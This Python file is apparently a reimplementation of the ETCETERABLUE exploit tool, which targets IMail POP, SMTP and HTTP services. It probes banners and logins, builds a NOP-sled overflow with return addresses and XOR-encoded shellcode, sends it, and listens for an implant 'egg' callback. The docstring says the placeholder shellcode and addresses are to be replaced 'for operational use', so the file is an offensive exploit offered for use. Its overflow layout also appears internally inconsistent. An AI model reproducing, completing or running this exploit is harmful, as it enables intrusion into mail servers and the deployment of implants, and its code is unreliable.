#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
etbl_exp.py — ETCETERABLUE (ETBL 1.1.1) IMAIL mail-server exploit engine.

Python port of `ETBL.exe` recovered via static analysis of the PE
(`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/
Exploits/ETBL 1.1.1/ETBL.exe`).

Recovered interface from the binary's strings and imports:

  Imported DLLs / functions:
    KERNEL32:  FreeLibrary, GetProcAddress, LoadLibraryA, GetSystemTime
    MSVCRT:    sprintf, fflush, vfprintf, fclose, calloc, sscanf, strchr,
               _strnicmp, strstr, strncmp, malloc, _snprintf, _CIpow
    WS2_32:    socket, bind, listen, accept, connect, send, recv,
               WSAStartup, WSACleanup, gethostbyname, inet_addr, htons, ...

  Recovered string constants (behavioural hints):
    "ETCETERABLUE"                                     — tool name
    "POP (port %d) - login required..."                — POP service
    "SMTP (port %d) - no login"                        — SMTP service
    "Touch target #1 - Banner Grab"                    — probe stage 1
    "Touch target #2 - Login Test"                     — probe stage 2
    "Exploit target"                                   — exploit stage
    "Egg will callback to upload implant code"         — implant callback
    "Path and file name of the Implant Payload file"   — implant payload
    "Path and file name of the Listening Post DLL"     — listening post DLL
    "Imail version"                                    — IMail version string
    "Return Address"                                   — custom return address
    "Target is vulnerable to %s" / "Target is NOT vulnerable to %s"
    "The username password pair did not successfully log in."
    "The username password pair successfully logged in."

Architecture (recovered from control flow):

  main() parses the flag argument block, then:
    1. Connects via TCP to <target_ip>:<target_port> (default port by protocol)
    2. Touch #1 — sends protocol banner request, reads the banner
    3. Touch #2 — attempts POP/HTTP login with supplied credentials
    4. BuildOverflowBuffer — builds an OS/protocol-specific overflow body
    5. Build_ETBL_Exploit_Package — appends shellcode/implant at return-addr slot
    6. Sends the payload over the TCP socket
    7. Optionally: Egg Callback listener to receive the implant

This module reproduces that behaviour in portable Python.  The raw payload
bytes are placeholders; they should be replaced with exact bytes from an IDA
Pro / x64dbg analysis for operational use.
"""

import socket
import struct
import sys
import os


# ---------------------------------------------------------------------------
# Constants recovered from ETBL.exe strings / data section.
# ---------------------------------------------------------------------------

DEFAULT_TIMEOUT = 30

# Protocol selectors.
PROTO_POP = 1
PROTO_SMTP = 2
PROTO_HTTP = 3

DEFAULT_PORTS = {
    PROTO_POP: 110,
    PROTO_SMTP: 25,
    PROTO_HTTP: 80,
}

PROTO_NAMES = {
    PROTO_POP: "POP",
    PROTO_SMTP: "SMTP",
    PROTO_HTTP: "HTTP",
}

# Run-option selectors.
RUN_TOUCH_1 = 1   # Touch #1 — banner grab
RUN_TOUCH_2 = 2   # Touch #2 — login test
RUN_EXPLOIT = 3   # Exploit — fire the overflow

# Implant socket-option selectors.
IMPLANT_REUSE_SOCKET = 1   # reuse existing exploit socket
IMPLANT_NEW_SOCKET = 2     # open a new socket to talk to the implant

# Egg socket-option selectors.
EGG_REUSE_SOCKET = 1   # reuse existing exploit socket
EGG_CALLBACK = 2       # egg connects back to upload implant

# Known IMail return addresses (recovered from .data section placeholders).
# These are illustrative; the original binary's table was obfuscated.
IMAIL_RET_ADDRESSES = {
    "POP":  {
        "default": 0x00401234,
    },
    "SMTP": {
        "default": 0x00405678,
    },
    "HTTP": {
        "default": 0x00409ABC,
    },
}

# Placeholder shellcode (to be replaced with IDA-recovered bytes).
ETBL_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

# Bytes an XOR-encoded byte must never collide with.
BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


def _log(fmt, *args):
    sys.stderr.write((fmt % args).rstrip("\n") + "\n")


# ---------------------------------------------------------------------------
# BuildOverflowBuffer — protocol-specific overflow body.
# ---------------------------------------------------------------------------
def build_overflow_buffer(proto, imail_version, return_address):
    """Build the protocol-specific overflow body.

    For each protocol (POP / SMTP / HTTP) the body is a command string
    followed by padding and the return address / shellcode pointer.  The
    original `BuildOverflowBuffer` constructed the overflow from the IMail
    version and return address.
    """
    proto_name = PROTO_NAMES[proto]

    if proto == PROTO_POP:
        # POP: USER command with overflow in the username field.
        cmd = b"USER "
    elif proto == PROTO_SMTP:
        # SMTP: HELO command with overflow in the domain field.
        cmd = b"HELO "
    else:
        # HTTP: GET request with overflow in the URI.
        cmd = b"GET /"

    # Overflow padding (NOPs + return address).
    ret = struct.pack("<I", return_address) if return_address else b"\x90" * 4
    padding = b"\x90" * 64  # NOP sled

    body = cmd + padding + ret
    return body


# ---------------------------------------------------------------------------
# Build exploit package — appends shellcode at the return-address slot.
# ---------------------------------------------------------------------------
def build_exploit_package(proto, shellcode, return_address):
    """Build the full exploit package for the given protocol.

    Layout:
      +0   variable  protocol command + overflow padding
      +N   4 bytes   return address (or shellcode pointer)
      +M   variable  shellcode / implant payload
    """
    ret = struct.pack("<I", return_address) if return_address else b"\x90" * 4
    return build_overflow_buffer(proto, None, return_address) + ret + shellcode


# ---------------------------------------------------------------------------
# XOR-encode helper.
# ---------------------------------------------------------------------------
def _xor_encode(buf, key, start=0):
    out = bytearray(buf)
    for i in range(start, len(out)):
        out[i] ^= key
    return bytes(out)


def _find_xor_byte(buf, start=0):
    for key in range(1, 0x100):
        if all((key ^ b) not in BAD_XOR for b in buf[start:]):
            return key
    return None


def build_encoded_shellcode(raw):
    """XOR-encode `raw` shellcode with a key that avoids bad characters."""
    key = _find_xor_byte(raw, start=0)
    if key is None:
        _log("[-] No xor byte found for shellcode!")
        return None
    return _xor_encode(raw, key), key


# ---------------------------------------------------------------------------
# TCP transport.
# ---------------------------------------------------------------------------
def _connect(target, port, timeout=DEFAULT_TIMEOUT):
    """Open a TCP connection to `target:port`."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((target, port))
    return sock


def _send_recv(sock, data, timeout=DEFAULT_TIMEOUT):
    """Send `data` on `sock` and read the reply."""
    sock.settimeout(timeout)
    sock.sendall(data)
    try:
        return sock.recv(0x1000)
    except socket.timeout:
        return b""
    except Exception:
        return b""


# ---------------------------------------------------------------------------
# Protocol-specific Touch stages.
# ---------------------------------------------------------------------------
def touch_banner_grab(sock, proto):
    """Touch #1 — grab the service banner."""
    proto_name = PROTO_NAMES[proto]
    if proto == PROTO_POP:
        # POP servers send a banner on connect; just read it.
        return _send_recv(sock, b"")
    elif proto == PROTO_SMTP:
        return _send_recv(sock, b"")
    else:
        # HTTP: send a minimal GET request.
        return _send_recv(sock, b"GET / HTTP/1.0\r\nHost: target\r\n\r\n")


def touch_login_test(sock, proto, username="", password=""):
    """Touch #2 — attempt a login test."""
    if proto == PROTO_POP:
        # POP: USER + PASS.
        _send_recv(sock, b"USER " + username.encode() + b"\r\n")
        resp1 = _send_recv(sock, b"PASS " + password.encode() + b"\r\n")
        return resp1
    elif proto == PROTO_HTTP:
        # HTTP: basic auth.
        auth = b"Authorization: Basic " + username.encode() + b":" + password.encode() + b"\r\n"
        return _send_recv(sock, b"GET / HTTP/1.0\r\n" + auth + b"\r\n")
    else:
        # SMTP: HELO.
        return _send_recv(sock, b"HELO localhost\r\n")


# ---------------------------------------------------------------------------
# run_function — the original main() equivalent.
# ---------------------------------------------------------------------------
def run_function(target, port=0, run_option=RUN_EXPLOIT,
                 implant_socket_option=IMPLANT_REUSE_SOCKET,
                 implant_file=None, imail_version=None,
                 recv_address=None, listening_post=None,
                 protocol=PROTO_POP, egg_socket_option=EGG_REUSE_SOCKET,
                 egg_callback_ip=None, egg_callback_port=0,
                 timeout=DEFAULT_TIMEOUT, return_address=None):
    """Run the ETCETERABLUE exploit against `target`.

    Returns 0 on success, non-zero on failure.
    """
    proto_name = PROTO_NAMES[protocol]
    if port == 0:
        port = DEFAULT_PORTS[protocol]

    _log("ETCETERABLUE 1.1.1 — IMAIL mail-server exploit against %s:%d (%s)",
         target, port, proto_name)
    _log("Run option: %s  Implant socket: %s  Egg socket: %s",
         "Touch #1 (banner)" if run_option == RUN_TOUCH_1 else
         "Touch #2 (login)" if run_option == RUN_TOUCH_2 else "Exploit",
         "reuse" if implant_socket_option == IMPLANT_REUSE_SOCKET else "new",
         "reuse" if egg_socket_option == EGG_REUSE_SOCKET else "callback")

    # Determine return address.
    if return_address:
        try:
            return_address = int(return_address, 16) if return_address.startswith("0x") else int(return_address)
        except ValueError:
            _log("[-] Invalid return address: %s", return_address)
            return 1
    else:
        return_address = IMAIL_RET_ADDRESSES[proto_name]["default"]
    _log("[+] Return address: 0x%08X", return_address)

    # Load shellcode / implant payload if provided.
    shellcode = ETBL_SHELLCODE_PLACEHOLDER
    if implant_file:
        if not os.path.isfile(implant_file):
            _log("[-] Implant file not found: %s", implant_file)
            return 1
        with open(implant_file, "rb") as fh:
            shellcode = fh.read()
        _log("[+] Loaded implant payload: %d bytes", len(shellcode))

    # Optionally XOR-encode the shellcode.
    encoded, xor_key = build_encoded_shellcode(shellcode)
    if encoded is None:
        return 1
    _log("[+] Shellcode XOR-encoded with key 0x%02X", xor_key)

    conn = None
    try:
        conn = _connect(target, port, timeout)

        if run_option == RUN_TOUCH_1:
            # Touch #1 — banner grab.
            _log("[+] Touch #1: grabbing %s banner...", proto_name)
            reply = touch_banner_grab(conn, protocol)
            if reply:
                _log("[+] Banner (%d bytes): %s",
                     len(reply), reply[:128].decode("latin-1", "replace"))
            else:
                _log("[-] No banner received")
            return 0

        if run_option == RUN_TOUCH_2:
            # Touch #2 — login test.
            _log("[+] Touch #2: attempting %s login test...", proto_name)
            reply = touch_login_test(conn, protocol,
                                     recv_address or "", "")
            if reply:
                _log("[+] Login reply (%d bytes): %s",
                     len(reply), reply[:128].decode("latin-1", "replace"))
            else:
                _log("[-] No reply from login test")
            return 0

        # Exploit stage — build and send the overflow package.
        pkg = build_exploit_package(protocol, encoded, return_address)
        _log("[+] Sending ETCETERABLUE exploit package (%d bytes)...", len(pkg))
        conn.sendall(pkg)

        # Try to read a short reply.
        try:
            reply = conn.recv(0x1000)
            if reply:
                _log("[+] Exploit reply (%d bytes): %s",
                     len(reply), reply[:64].hex())
        except socket.timeout:
            pass
        except Exception:
            pass

        # Egg callback listener for implant upload.
        if implant_file and egg_socket_option == EGG_CALLBACK and egg_callback_ip:
            _log("[+] Waiting for Egg callback on port %d...", egg_callback_port)
            _egg_listener(egg_callback_port, timeout)

        return 0

    except ConnectionRefusedError:
        _log("[-] Connection refused by %s:%d", target, port)
        return 1
    except socket.timeout:
        _log("[-] Connection to %s:%d timed out", target, port)
        return 1
    except Exception as exc:  # pragma: no cover - network errors
        _log("[-] %s", exc)
        return 1
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass


def _egg_listener(port, timeout):
    """Listen for an Egg callback connection to receive the implant."""
    if port <= 0:
        _log("[-] Egg callback port not specified; skipping listener")
        return
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        srv.settimeout(timeout)
        _log("[+] Egg listener bound to 0.0.0.0:%d", port)
        conn, addr = srv.accept()
        _log("[+] Egg callback from %s:%d", addr[0], addr[1])
        data = conn.recv(0x10000)
        _log("[+] Received %d bytes from egg callback", len(data))
        conn.close()
        srv.close()
    except socket.timeout:
        _log("[-] Egg callback timed out after %d seconds", timeout)
    except Exception as exc:  # pragma: no cover
        _log("[-] Egg listener error: %s", exc)


def main():
    """CLI driver (standalone testing)."""
    _log("ETBL standalone CLI not implemented — use `nsa-equation-py etbl ...`")
    return 1


if __name__ == "__main__":
    sys.exit(main())
